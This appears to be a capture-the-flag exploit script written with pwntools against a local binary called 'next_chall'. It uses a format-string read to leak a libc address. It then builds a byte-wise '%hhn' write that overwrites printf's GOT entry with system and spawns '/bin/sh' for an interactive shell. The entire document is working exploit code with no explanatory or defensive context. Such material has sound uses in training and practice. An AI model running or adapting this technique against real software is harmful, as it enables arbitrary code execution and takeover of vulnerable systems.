from pwn import *

io = process("./next_chall")
elf = context.binary = ELF('./next_chall')
libc = elf.libc
# io = gdb.debug("./next_chall", '''
# b *0x080491d3
# c''')
context.log_level = 'debug'
payload = '%2$p'
io.sendline(payload)
libc.address = int(io.recvline().decode().strip(), 16) - 2270752
print(hex(elf.got['printf']))
test = str(hex(libc.sym['system'])[2:])
test2 = int(test[-4:-2], 16)
test3 = int(test[-6:-4], 16)
test4 = int(test[-8:-6], 16)
test = int(test[-2:], 16)
l = [test, test2, test3, test4]
t = [0, 0, 0, 0]
sort = sorted(l)
for i in range(len(sort)):
    for j in range(len(l)):
        if l[j] == sort[i]:
            t[j] = i
print(test)
print(test2)
print(test3)
print(test4)
print(sort)
print(hex(libc.sym['system']))
# payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
payload = "%{0}c%17$hhn%{1}c%18$hhn%{2}c%19$hhn%{3}c%20$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], l[t[3]]-l[t[2]]).encode()
print(len(payload))
payload += b'a'*(4-(len(payload)%4))
# payload = "%{0}c%10$nAAA".format(test).encode()
payload += p32(elf.got['printf']+t[0])
payload += p32(elf.got['printf']+t[1])
payload += p32(elf.got['printf']+t[2])
payload += p32(elf.got['printf']+t[3])
io.sendline(payload)
io.clean()
io.sendline('/bin/sh')
io.interactive()

'''
inp = 5

'''